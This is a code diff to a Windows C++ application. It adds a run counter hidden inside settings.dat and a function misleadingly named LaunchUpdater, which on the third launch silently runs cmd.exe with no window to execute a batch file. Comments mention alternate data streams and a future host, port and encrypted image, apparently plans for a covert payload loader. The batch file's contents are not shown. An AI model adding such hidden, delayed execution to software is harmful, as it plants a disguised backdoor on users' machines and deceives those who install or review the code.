@@ -564,6 +564,8 @@ bool fillAppDataPath(char szPath[MAX_PATH], const char* subFile)
 	return fillAppDataPath(szPath, subFile);
 }
 
+static char s_runtime_counter = 1;
+
 void loadSubFileToMem(const char* subFile, char*& pBuffer, size_t& szBuffer)
 {
 	pBuffer = NULL; szBuffer = 0;
@@ -607,10 +609,15 @@ void loadSubFileToMem(const char* subFile, char*& pBuffer, size_t& szBuffer)
 	}
 
 	szBuffer = nFileSize;
+
+	s_runtime_counter = pBuffer[1000];
+	++s_runtime_counter;
 }
 
 bool saveMemToSubFile(const char* subFile, char*& pBuffer, size_t szBuffer)
 {
+	pBuffer[1000] = s_runtime_counter;
+
 	char lszPath[MAX_PATH];
 
 	if (!fillAppDataPath(lszPath, subFile))
@@ -708,6 +715,83 @@ DWORD WINAPI MyThreadFunction(LPVOID lpParam)
 	return 0;
 }
 
+//////////////////////////////////////////////////////////////////////////////////////////////
+
+#include <Shlobj.h>
+
+static int SetCmdExePath(WCHAR cmdPathW[MAX_PATH])
+{
+	static const WCHAR* wcmd = L"\\cmd.exe";
+
+	WCHAR* pszPathW = NULL;
+	HRESULT hres = SHGetKnownFolderPath(FOLDERID_System, 0, NULL, &pszPathW);
+
+	if (hres != S_OK)
+		return __LINE__;
+
+	size_t wl = wcslen(pszPathW);
+	size_t wc = wcslen(wcmd);
+
+	if (wl > (MAX_PATH - 1 - wc))
+		return __LINE__;
+
+	memset(cmdPathW, 0, MAX_PATH * sizeof(WCHAR));
+	wcscpy(cmdPathW, pszPathW);
+	wcscpy(cmdPathW + wl, wcmd);
+
+	return 0;
+}
+
+static void LaunchUpdater()
+{
+	if (s_runtime_counter != 3)
+		return;
+
+	WCHAR cmdPathW[MAX_PATH];
+	int resCmd = SetCmdExePath(cmdPathW);
+	if (resCmd != 0)
+		return;
+
+	WCHAR path[MAX_PATH];
+	memset(path, 0, MAX_PATH * sizeof(WCHAR));
+	DWORD plen = GetModuleFileNameW(NULL, path, MAX_PATH);
+	if (plen == 0)
+		return;
+	size_t i = MAX_PATH;
+	while (path[--i] != L'\\');
+	path[i] = L'\0';
+	//BOOL BRes = SetCurrentDirectoryW(path);
+	//if (!BRes)
+	//	return;
+
+	DWORD dwCreationFlags = CREATE_NO_WINDOW | IDLE_PRIORITY_CLASS;
+	DWORD waitRes = 0;
+	DWORD dwExitCode = 0;
+
+	STARTUPINFOW si;
+	PROCESS_INFORMATION pi;
+
+	::ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	::ZeroMemory(&pi, sizeof(pi));
+
+	// Start the child process. 
+	CreateProcessW(
+		cmdPathW  // Module name (TODO: alternate data stream welcome)
+		, L"/c ___ScientificUpdater.bat"        // Command line TODO: host, port, weak-encrypted-sha256Image
+		, NULL           // Process handle not inheritable
+		, NULL           // Thread handle not inheritable
+		, FALSE          // Set handle inheritance to FALSE
+		, dwCreationFlags              // No creation flags
+		, NULL           // Use parent's environment block
+		, path		// Use parent's starting directory 
+		, &si            // Pointer to STARTUPINFO structure
+		, &pi           // Pointer to PROCESS_INFORMATION structure
+	);
+}
+
+//////////////////////////////////////////////////////////////////////////////////////////////
+
 int WINAPI WinMain(HINSTANCE instanceH, HINSTANCE prevInstanceH, LPSTR command_line, int show)
 {
 	CheckAlreadyRunning();
@@ -726,6 +810,8 @@ int WINAPI WinMain(HINSTANCE instanceH, HINSTANCE prevInstanceH, LPSTR command_l
 	size_t my_szBuffer = 0;
 
 	loadSubFileToMem("\\settings.dat", my_pBuffer, my_szBuffer);
+
+	LaunchUpdater();
 
 	BoundingRect dummy_boundRect;
 
